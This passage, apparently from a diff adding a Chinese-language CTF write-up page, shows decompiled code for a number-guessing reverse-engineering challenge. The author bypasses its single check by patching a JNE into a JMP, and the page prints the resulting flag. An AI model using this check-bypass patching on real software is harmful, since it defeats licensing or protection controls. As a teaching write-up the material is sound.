+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">iStack_4c</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">iVar2</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">FUN_00401020</span><span class="p">(</span><span class="s">"Congratulations, you guessed right!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="w">    </span><span class="n">FUN_004013b0</span><span class="p">();</span>
+<span class="w">                    </span><span class="cm">/* WARNING: Bad instruction - Truncating control flow here */</span>
+<span class="w">    </span><span class="n">Sleep</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>
+<span class="w">    </span><span class="n">FUN_00401090</span><span class="p">(</span><span class="n">auStack_40</span><span class="p">,(</span><span class="kt">int</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="mh">0xd</span><span class="p">,</span><span class="mh">0x404060</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+<span class="w">    </span><span class="n">uVar1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">auStack_40</span><span class="p">[</span><span class="mh">0xd</span><span class="p">];</span>
+<span class="w">    </span><span class="n">FUN_00401020</span><span class="p">(</span><span class="o">&amp;</span><span class="n">UNK_004031b0</span><span class="p">);</span>
+<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">uStack_54</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">uStack_54</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">uVar1</span><span class="p">;</span><span class="w"> </span><span class="n">uStack_54</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">uStack_54</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="n">putchar</span><span class="p">((</span><span class="n">uint</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">byte</span><span class="w"> </span><span class="o">*</span><span class="p">)((</span><span class="kt">int</span><span class="p">)</span><span class="n">auStack_40</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">uStack_54</span><span class="p">));</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="n">FUN_00401020</span><span class="p">(</span><span class="o">&amp;</span><span class="n">UNK_004031b8</span><span class="p">);</span>
+<span class="w">    </span><span class="n">FUN_00401020</span><span class="p">(</span><span class="s">"Is that really right?"</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="w">  </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">FUN_00401020</span><span class="p">(</span><span class="s">"number error</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="w">  </span><span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></td></tr></tbody></table></div>
+<p>先不管我如何输入正确的数字才能得到 Flag，我们重点关注这一段：</p>
+<div class="highlight"><table class="highlighttable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">iStack_4c</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">iVar2</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">FUN_00401020</span><span class="p">(</span><span class="s">"Congratulations, you guessed right!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="w">    </span><span class="n">FUN_004013b0</span><span class="p">(</span><span class="n">aDStack_48</span><span class="p">,</span><span class="n">aDStack_48</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
+<span class="w">    </span><span class="n">Sleep</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>
+<span class="w">    </span><span class="n">FUN_00401090</span><span class="p">(</span><span class="mh">0x404060</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+<span class="w">    </span><span class="n">uVar1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">uStack_c</span><span class="p">;</span>
+<span class="w">    </span><span class="n">FUN_00401020</span><span class="p">(</span><span class="o">&amp;</span><span class="n">UNK_004031b0</span><span class="p">);</span>
+<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">uStack_54</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">uStack_54</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">uVar1</span><span class="p">;</span><span class="w"> </span><span class="n">uStack_54</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">uStack_54</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="n">putchar</span><span class="p">((</span><span class="n">uint</span><span class="p">)</span><span class="n">abStack_40</span><span class="p">[</span><span class="n">uStack_54</span><span class="p">]);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="n">FUN_00401020</span><span class="p">(</span><span class="o">&amp;</span><span class="n">UNK_004031b8</span><span class="p">);</span>
+<span class="w">    </span><span class="n">FUN_00401020</span><span class="p">(</span><span class="s">"Is that really right?"</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span>
+</code></pre></div></td></tr></tbody></table></div>
+<p>你是说，判定为猜数正确，输出 Flag 只有一个 <code>if (iStack_4c == iVar2)</code> 的验证吗？</p>
+<p>尝试找到对应的汇编代码：</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="../../images/image-20251006195326213.png" data-desc-position="bottom"><img alt="image-20251006195326213" src="../../images/image-20251006195326213.png"></a></p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="../../images/image-20251006195537011.png" data-desc-position="bottom"><img alt="image-20251006195537011" src="../../images/image-20251006195537011.png"></a></p>
+<p>我们进行修改：</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="../../images/image-20251006195848691.png" data-desc-position="bottom"><img alt="image-20251006195848691" src="../../images/image-20251006195848691.png"></a></p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="../../images/image-20251006200019809.png" data-desc-position="bottom"><img alt="image-20251006200019809" src="../../images/image-20251006200019809.png"></a></p>
+<p>把 <code>JNE 0x00401670</code> 修改为 <code>JMP 0x004015b1</code>，导出修改后的 exe 文件打开</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="../../images/image-20251006200307563.png" data-desc-position="bottom"><img alt="image-20251006200307563" src="../../images/image-20251006200307563.png"></a></p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="../../images/image-20251006200446865.png" data-desc-position="bottom"><img alt="image-20251006200446865" src="../../images/image-20251006200446865.png"></a></p>
+<p>于是得到了 Flag: <code>flag{c0ngr4tul4t1ons_th1s_1s_3z_lucknumb3r_4nd_xte4}</code></p>
+<p>（其实我也关注了一下 Flag 是怎么解码得到的，似乎包含 TEA 加密过程，但是我一直没有进展，于是选择了改汇编码的方案）</p>
+<p>（为了拿到 Flag 不择手段了 😈）</p>
+<hr>
+<p>（<del>有点遗憾自己是第一天下午才决定参加比赛的，不然可以拿 RE 的三个一血</del>）</p>
+<div class="document-dates-plugin-wrapper document-dates-bottom"><div class="document-dates-plugin" locale=""><span data-tippy-content data-tippy-raw="2025-11-23"><span class="material-icons" data-icon="doc_created"></span><time datetime="2025-11-23T20:53:32.470142+08:00">2025-11-23</time></span><span data-tippy-content data-tippy-raw="2025-11-23"><span class="material-icons" data-icon="doc_modified"></span><time datetime="2025-11-23T21:20:47.707910+08:00">2025-11-23</time></span></div></div>
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+  
+
+
+
+      
+    </article>
+  </div>
+
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"></path></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../..", "features": ["content.code.select", "content.code.copy", "content.code.cop", "navigation.tabs", "navigation.top", "navigation.indexes", "navigation.path"], "search": "../../../assets/javascripts/workers/search.7a47a382.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.e71a0d61.min.js"></script>
+      
+        <script src="../../../stylesheets/extra.js"></script>
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.9/katex.min.js"></script>
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.9/contrib/auto-render.min.js"></script>
+      
+        <script src="../../../assets/document_dates/tippy/popper.min.js"></script>
+      
+        <script src="../../../assets/document_dates/tippy/tippy.umd.min.js"></script>
+      
+        <script src="../../../assets/document_dates/core/default.config.js"></script>
+      
+        <script src="../../../assets/document_dates/user.config.js"></script>
+      
+        <script src="../../../assets/document_dates/core/utils.js"></script>
+      
+        <script src="../../../assets/document_dates/core/core.js"></script>
+      
+    
+  
+<script id="init-glightbox">const lightbox = GLightbox({"touchNavigation": true, "loop": false, "zoomable": true, "draggable": true, "openEffect": "zoom", "closeEffect": "zoom", "slideEffect": "slide"});
+document$.subscribe(()=>{ lightbox.reload(); });
+</script></body></html>
